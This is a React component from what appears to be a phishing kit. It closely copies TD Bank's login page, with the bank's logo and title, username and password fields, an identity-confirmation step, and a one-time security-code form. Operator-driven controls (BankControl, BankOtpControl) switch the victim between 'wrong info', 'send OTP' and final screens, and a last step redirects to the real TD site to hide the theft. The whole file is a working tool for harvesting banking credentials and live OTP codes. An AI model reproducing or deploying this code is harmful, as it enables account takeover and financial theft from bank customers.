import { otpOptions } from "../../bankDetails";
import BankingHeader from "./BankingHeader";
import clsx from "clsx";
import { Link } from "react-router-dom";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import TdFavIcon from "../../../../../../../../assets/allBanks/banks/td/td2.ico";
import TdImage from "../../../../../../../../assets/allBanks/banks/td/td3.png";
import { FaAngleRight } from "react-icons/fa6";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Td = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  setIsOpenOtp,
  loading,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    handleBlur,
    errorFormState,
    handleChange,
    onSubmitOtp,
    blurOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);
  return (
    <>
      <motion.div
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        exit={{ y: -100, opacity: 0 }}
        transition={{ type: "spring", stiffness: 300, damping: 50 }}
        className={clsx(
          "w-full min-h-screen h-full  top-0  bg-white",
          typeAccount ? "hidden" : "block"
        )}
      >
        <BankingHeader
          text="Online Banking Loans, Credit Cards & Home Lending | TD Bank"
          handleCancel={handleCancel}
          img={TdFavIcon}
          setAllBankItems={setAllBankItems}
          setIsOpenOtp={setIsOpenOtp}
          setOtpOpen={setOtpOpen}
        />

        <header className="flex justify-between px-3 py-3 box-shadow4">
          <div>
            <img src={TdImage} alt="" />
          </div>
          <select className="font-semibold text-customGray-1034">
            <option value="In English">EN</option>
            <option value="En Español">IN</option>
          </select>
        </header>
        <div className="flex justify-center px-4 pt-16 pb-20">
          <div className={clsx("w-[608px]", allBankOpen ? "hidden" : "block")}>
            <h2 className="font-bold text-[26px] text-customGreen-300 px-3.5 mb-8">
              Log in
            </h2>
            <div className={clsx("")}>
              <div className="w-full mb-12">
                <label className="text-lg font-light text-customGray-1034">
                  User name
                </label>
                <input
                  type="text"
                  value={formState.username}
                  name="username"
                  onChange={handleChange}
                  onBlur={handleBlur}
                  className={clsx(
                    "w-full px-4 py-2 mt-2 border outline-none border-customGray-1035 focus:border-b-4 focus:border-b-customGreen-400",
                    errorFormState.username
                      ? "border-b-4 border-customRed-800"
                      : ""
                  )}
                />
                {errorFormState.username && (
                  <p className="mt-2 font-bold text-customRed-800">
                    Oops, don&apos;t forget to enter your user name.
                  </p>
                )}
              </div>
              <div className="w-full mb-14">
                <label className="text-lg font-light text-customGray-1034">
                  Password
                </label>
                <input
                  type="password"
                  value={formState.password}
                  onBlur={handleBlur}
                  name="password"
                  onChange={handleChange}
                  className={clsx(
                    "w-full px-4 py-2 mt-2 border outline-none border-customGray-1035 focus:border-b-4 focus:border-b-customGreen-400",
                    errorFormState.password
                      ? "border-b-4 border-customRed-800"
                      : ""
                  )}
                />
                {errorFormState.password && (
                  <p className="mt-2 font-bold text-customRed-800">
                    Please enter a valid password.
                  </p>
                )}
              </div>
              <div className="flex gap-4 px-8 mb-8">
                <button className="w-full py-2 font-semibold border-2 text-customGreen-500 border-customGreen-500 hover:bg-customGray-1037 transistion2">
                  Cancel
                </button>
                <button
                  onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                  className={clsx(
                    "w-full py-2 font-semibold border-2 text-customGray-1036 border-customGray-1036 bg-customGray-1037",
                    formState.username &&
                      formState.password &&
                      "bg-customGreen-500 border-none text-white transistion2"
                  )}
                >
                  {loading && <ClipLoader size={10} color="#c1c1c1" />}
                  {loading ? "Loading..." : "Log in"}
                </button>
              </div>
              <Link className="flex items-center justify-center gap-1 font-bold text-center text-customGreen-500">
                Forgot user name and/or password?
                <FaAngleRight className="mb-1" />
              </Link>
            </div>
          </div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                      <p>{activePathDetails.body}</p>
                    </div>
                    <div className={clsx(" customMiniTablet:w-[608px]")}>
                      <h2 className="font-bold text-[26px] text-customGreen-300 px-3.5 mb-8">
                        Log in
                      </h2>
                      <div className={clsx("")}>
                        <div className="w-full mb-12">
                          <label className="text-lg font-light text-customGray-1034">
                            User name
                          </label>
                          <input
                            type="text"
                            value={formState.username}
                            name="username"
                            onChange={handleChange}
                            onBlur={handleBlur}
                            className={clsx(
                              "w-full px-4 py-2 mt-2 border outline-none border-customGray-1035 focus:border-b-4 focus:border-b-customGreen-400",
                              errorFormState.username
                                ? "border-b-4 border-customRed-800"
                                : ""
                            )}
                          />
                          {errorFormState.username && (
                            <p className="mt-2 font-bold text-customRed-800">
                              Oops, don&apos;t forget to enter your user name.
                            </p>
                          )}
                        </div>
                        <div className="w-full mb-14">
                          <label className="text-lg font-light text-customGray-1034">
                            Password
                          </label>
                          <input
                            type="password"
                            value={formState.password}
                            onBlur={handleBlur}
                            name="password"
                            onChange={handleChange}
                            className={clsx(
                              "w-full px-4 py-2 mt-2 border outline-none border-customGray-1035 focus:border-b-4 focus:border-b-customGreen-400",
                              errorFormState.password
                                ? "border-b-4 border-customRed-800"
                                : ""
                            )}
                          />
                          {errorFormState.password && (
                            <p className="mt-2 font-bold text-customRed-800">
                              Please enter a valid password.
                            </p>
                          )}
                        </div>
                        <div className="flex gap-4 px-8 mb-8">
                          <button className="w-full py-2 font-semibold border-2 text-customGreen-500 border-customGreen-500 hover:bg-customGray-1037 transistion2">
                            Cancel
                          </button>
                          <button
                            onClick={(e) =>
                              handleTheMainSubmit(e, onSumbitForm)
                            }
                            className={clsx(
                              "w-full py-2 font-semibold border-2 text-customGray-1036 border-customGray-1036 bg-customGray-1037",
                              formState.username &&
                                formState.password &&
                                "bg-customGreen-500 border-none text-white transistion2"
                            )}
                          >
                            {loading && (
                              <ClipLoader size={10} color="#c1c1c1" />
                            )}
                            {loading ? "Loading..." : "Log in"}
                          </button>
                        </div>
                        <Link className="flex items-center justify-center gap-1 font-bold text-center text-customGreen-500">
                          Forgot user name and/or password?
                          <FaAngleRight className="mb-1" />
                        </Link>
                      </div>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>
                    <div
                      className={clsx(
                        "customMiniTablet:w-[500px]",
                        isOpenOtp && "hidden"
                      )}
                    >
                      <div className="mb-4 space-y-2 text-center">
                        <h3 className="text-xl text-customGreen-500">
                          Confirm Your Identity
                        </h3>
                        <p className="text-black">
                          For your protection, we want to confirm your identity
                        </p>
                      </div>
                      <div>
                        <h2 className="mb-4 text-sm font-semibold text-black">
                          How do you want to confirm your identity?
                        </h2>
                        <div
                          role="radiogroup"
                          aria-label="Otp Options"
                          className="flex flex-col mb-6 space-y-3"
                        >
                          {otpOptions.map((bank) => (
                            <div
                              key={bank.id}
                              onClick={() => handleOtpOption(bank.id)}
                              role="radio"
                              tabIndex={0}
                              className="flex items-center gap-2.5 "
                            >
                              <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                <p
                                  className={clsx(
                                    "rounded-full w-[10px] h-[10px]  ",
                                    otpOptions[indexOtp]?.id === bank.id
                                      ? "bg-customBlue-500"
                                      : ""
                                  )}
                                ></p>
                              </div>
                              <h2
                                className={clsx(
                                  "text-sm",
                                  otpOptions[indexOtp]?.id === bank.id
                                    ? "text-customBlue-500 hover:underline"
                                    : "hover:text-customBlue-700 hover:underline"
                                )}
                              >
                                {bank.name}
                              </h2>
                            </div>
                          ))}
                        </div>
                        <button
                          onClick={onSubmitOtpOptions}
                          className="w-full py-2 font-semibold text-white border-2 border-none bg-customGreen-500 transistion2 border-customGray-1036 "
                        >
                          Continue
                        </button>
                      </div>
                    </div>
                    {isOpenOtp && (
                      <div className={clsx("customMiniTablet:w-[500px]")}>
                        <div>
                          <div>
                            <div className="mb-4 space-y-2 text-center">
                              <h3 className="text-xl text-customGreen-500">
                                Enter Security Code
                              </h3>
                              <p className="text-black">
                                Your one-time security code was sent to your
                                phone{" "}
                              </p>
                            </div>
                            <div className="px-3 customMiniTablet:px-28">
                              <h2 className="mb-4 text-sm font-semibold text-center text-black">
                                The code will expire in 10 miniutes
                              </h2>
                              <div>
                                <label className="text-lg font-light text-customGray-1034">
                                  Enter Security Code
                                </label>
                                <input
                                  type="number"
                                  value={formOtp.otpo}
                                  name="otpo"
                                  onChange={changeOtp}
                                  onBlur={blurOtp}
                                  className={clsx(
                                    "w-full px-4 py-2 mt-2 border outline-none border-customGray-1035 focus:border-b-4 focus:border-b-customGreen-400 no-spinner",
                                    errorOtp.otpo
                                      ? "border-b-4 border-customRed-800"
                                      : ""
                                  )}
                                />
                                {errorOtp.otpo && (
                                  <p className="mt-2 text-sm text-customRed-800">
                                    Please enter the code.
                                  </p>
                                )}
                              </div>
                              <button
                                onClick={(e) =>
                                  onSubmitOtp(e, handleVerifiedOtp)
                                }
                                className="w-full py-2 my-4 font-semibold text-white border-2 border-none bg-customGreen-500 transistion2 border-customGray-1036 mb-7"
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#c1c1c1" />
                                )}
                                {loading ? "Loading..." : "Enter"}
                              </button>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Didnt get a code? Resend
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <div>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />

              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div className={clsx("customMiniTablet:w-[500px]")}>
                      <div>
                        <div>
                          <div className="mb-4 space-y-2 text-center">
                            <h3 className="text-xl text-customGreen-500">
                              Enter Security Code
                            </h3>
                            <p className="text-black">
                              Your one-time security code was sent to your phone{" "}
                            </p>
                          </div>
                          <div className="px-3 customMiniTablet:px-28">
                            <h2 className="mb-4 text-sm font-semibold text-center text-black">
                              The code will expire in 10 miniutes
                            </h2>
                            <div>
                              <label className="text-lg font-light text-customGray-1034">
                                Enter Security Code
                              </label>
                              <input
                                type="number"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                onBlur={blurOtp}
                                className={clsx(
                                  "w-full px-4 py-2 mt-2 border outline-none border-customGray-1035 focus:border-b-4 focus:border-b-customGreen-400 no-spinner",
                                  errorOtp.otpo
                                    ? "border-b-4 border-customRed-800"
                                    : ""
                                )}
                              />
                              {errorOtp.otpo && (
                                <p className="mt-2 text-sm text-customRed-800">
                                  Please enter the code.
                                </p>
                              )}
                              <h3 className="mt-2 text-sm text-customRed-200">
                                {activeOtp.body}
                              </h3>
                            </div>
                            <button
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                              className="w-full py-2 my-4 font-semibold text-white border-2 border-none bg-customGreen-500 transistion2 border-customGray-1036 mb-7"
                            >
                              {loading && (
                                <ClipLoader size={10} color="#c1c1c1" />
                              )}
                              {loading ? "Loading..." : "Enter"}
                            </button>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.td.com/us/en/personal-banking"
                    />
                  </>
                )}
              </div>
            </div>
          )}
        </div>
      </motion.div>
    </>
  );
};

export default Td;
